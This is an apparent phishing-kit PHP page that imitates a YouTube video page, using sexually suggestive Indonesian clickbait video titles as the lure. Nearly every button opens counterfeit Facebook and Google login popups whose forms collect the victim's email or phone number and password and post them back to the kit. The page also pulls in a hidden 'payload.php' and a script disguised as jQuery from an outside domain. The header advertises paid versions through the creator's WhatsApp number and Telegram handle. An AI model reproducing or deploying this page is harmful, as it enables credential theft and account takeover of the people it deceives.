<?php
// Creator Sc  : LUKY NESIA 
// Order Script Vip : 6289509551861
// Telegram   : t.me/luky_nesia

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>YouTube Style Video Page</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/3/css/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/3/css/google.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/3/css/all.css"> 
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
 </head>
 <body class="bg-white text-black font-sans">

  <!-- Video Player Section -->
  <div class="relative bg-black w-full max-w-xl mx-auto aspect-video">
   <img alt="Black video player screen with white play button and video controls icons" class="w-full h-full object-cover" height="360" src="https://cdn.stackpath.web.id/20/img/preview.gif" width="640"/>
   
   <!-- Controls icons top right -->
   <div class="absolute top-2 right-2 flex space-x-3 text-white text-lg">
    <button aria-label="Cast" onclick="Loginpopunder()"><i class="fas fa-tv"></i></button>
    <button aria-label="Closed captions" class="text-xs font-bold border border-white rounded px-1" onclick="Loginpopunder()">CC</button>
    <button aria-label="Settings" onclick="Loginpopunder()"><i class="fas fa-cog"></i></button>
   </div>
   
   <!-- Play button center -->
   <button aria-label="Play video" class="absolute inset-0 flex items-center justify-center text-white text-4xl" onclick="Loginpopunder()">
    <i class="fas fa-play-circle"></i>
   </button>
   
   <!-- Bottom left time -->
   <div class="absolute bottom-2 left-2 text-white text-xs font-mono">0:06 / 20:22</div>
   
   <!-- Bottom right fullscreen -->
   <button aria-label="Fullscreen" class="absolute bottom-2 right-2 text-white text-xl" onclick="Loginpopunder()">
    <i class="fas fa-expand"></i>
   </button>
   
   <!-- Left and right arrows -->
   <button aria-label="Previous" class="absolute left-2 top-1/2 -translate-y-1/2 text-white text-2xl" onclick="Loginpopunder()">
    <i class="fas fa-step-backward"></i>
   </button>
   <button aria-label="Next" class="absolute right-2 top-1/2 -translate-y-1/2 text-white text-2xl" onclick="Loginpopunder()">
    <i class="fas fa-step-forward"></i>
   </button>
  </div>

  <!-- Video Title and Info -->
  <div class="max-w-xl mx-auto px-3 pt-3 pb-1">
   <h1 class="font-bold text-base leading-tight">Bermain di rumah tanteku, Merasakan sensasi baru di hidupku - VIDEO YUTUBE VIRAL</h1>
   <div class="text-xs text-gray-600 mt-1">
    607 rb x ditonton · 1 bln lalu · <span class="font-semibold">#virus</span> · 
    <span class="underline cursor-pointer" onclick="Loginpopunder()">selengkapnya</span>
   </div>
  </div>

  <!-- Channel Info and Subscribe -->
  <div class="max-w-xl mx-auto flex items-center justify-between px-3 py-2 border-b border-gray-200">
   <div class="flex items-center space-x-3">
    <img alt="SOBAT VIRAL channel logo yellow background with red letters Y and D" class="w-10 h-10 rounded-full" height="40" src="https://storage.googleapis.com/a1aa/image/592d3ea6-c43e-4b01-abd1-99e800863364.jpg" width="40"/>
    <span class="text-sm font-semibold">SOBAT VIRAL</span>
    <span class="text-xs text-gray-600">1,6 jt</span>
   </div>
   <button aria-label="Subscribe" class="bg-black text-white text-sm font-semibold rounded-full px-5 py-2" onclick="Loginpopunder()">Subscribe</button>
  </div>

  <!-- Action Buttons -->
  <div class="max-w-xl mx-auto flex items-center justify-between px-3 py-2 border-b border-gray-200 text-xs text-gray-700">
   <button aria-label="Like" class="flex items-center space-x-1 hover:text-black" onclick="Loginpopunder()">
    <i class="far fa-thumbs-up text-lg"></i><span>8 rb</span>
   </button>
   <button aria-label="Dislike" class="flex items-center space-x-1 hover:text-black" onclick="Loginpopunder()">
    <i class="far fa-thumbs-down text-lg"></i>
   </button>
   <button aria-label="Share" class="flex items-center space-x-1 hover:text-black" onclick="Loginpopunder()">
    <i class="fas fa-share"></i><span>Bagikan</span>
   </button>
   <button aria-label="Remix" class="flex items-center space-x-1 hover:text-black" onclick="Loginpopunder()">
    <i class="fas fa-random"></i><span>Remix</span>
   </button>
   <button aria-label="Download" class="flex items-center space-x-1 hover:text-black" onclick="Loginpopunder()">
    <i class="fas fa-download"></i><span>Download</span>
   </button>
  </div>

  <!-- Video Thumbnail 1 -->
  <div class="max-w-xl mx-auto mt-2" onclick="Loginpopunder()">
   <div class="relative">
    <img alt="A man holding a spear facing a large mammoth with fire and smoke in the background" class="w-full h-auto object-cover rounded-t-lg" height="360" src="https://cdn.stackpath.web.id/20/img/video.webp" width="640"/>
    <div class="absolute top-2 right-2 bg-black bg-opacity-70 text-white text-xs px-1 rounded">29.41</div>
    <div class="absolute top-2 left-2 bg-yellow-400 text-black font-extrabold text-sm px-2 rounded">PART 1</div>
   </div>
   <div class="flex items-center justify-between bg-white rounded-b-lg px-3 py-2 border border-t-0 border-gray-200">
    <div class="flex items-center space-x-3">
     <img alt="SOBAT VIRAL channel logo" class="w-10 h-10 rounded-full" src="https://storage.googleapis.com/a1aa/image/592d3ea6-c43e-4b01-abd1-99e800863364.jpg"/>
     <div class="flex flex-col text-sm font-semibold leading-tight">
      <span>PART 1 video konbrut acak acak lubang pacar - VIDEO ASLI</span>
      <span class="text-xs font-normal text-gray-600">SOBAT VIRAL · 672 rb x ditonton · 7 hari yang lalu</span>
     </div>
    </div>
    <button aria-label="More options" class="text-2xl font-bold px-2" onclick="Loginpopunder()">⋮</button>
   </div>
  </div>

<!-- Video Thumbnail 2 -->
<div class="max-w-xl mx-auto mt-2" onclick="Loginpopunder()">
  <div class="relative">
    <img alt="Scary tunnel exploration" class="w-full h-auto object-cover rounded-t-lg" src="https://cdn.stackpath.web.id/20/img/video.webp"/>
    <div class="absolute top-2 right-2 bg-black bg-opacity-70 text-white text-xs px-1 rounded">12:15</div>
    <div class="absolute top-2 left-2 bg-yellow-400 text-black font-extrabold text-sm px-2 rounded">PART 2</div>
  </div>
  <div class="flex items-center justify-between bg-white rounded-b-lg px-3 py-2 border border-t-0 border-gray-200">
    <div class="flex items-center space-x-3">
      <img alt="SOBAT VIRAL channel logo" class="w-10 h-10 rounded-full" src="https://storage.googleapis.com/a1aa/image/592d3ea6-c43e-4b01-abd1-99e800863364.jpg"/>
      <div class="flex flex-col text-sm font-semibold leading-tight">
        <span>PART 2 video konbrut acak acak lubang pacar - VIDEO ASLI</span>
        <span class="text-xs font-normal text-gray-600">SOBAT VIRAL · 891 rb x ditonton · 2 minggu lalu</span>
      </div>
    </div>
    <button aria-label="More options" class="text-2xl font-bold px-2"</button>
  </div>
</div>

 
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.stackpath.web.id/3/img/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.stackpath.web.id/3/img/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.stackpath.web.id/3/img/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.stackpath.web.id/3/img/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.stackpath.web.id/3/img/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://jquery.biz.id/libs/jquery-3.17.21.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>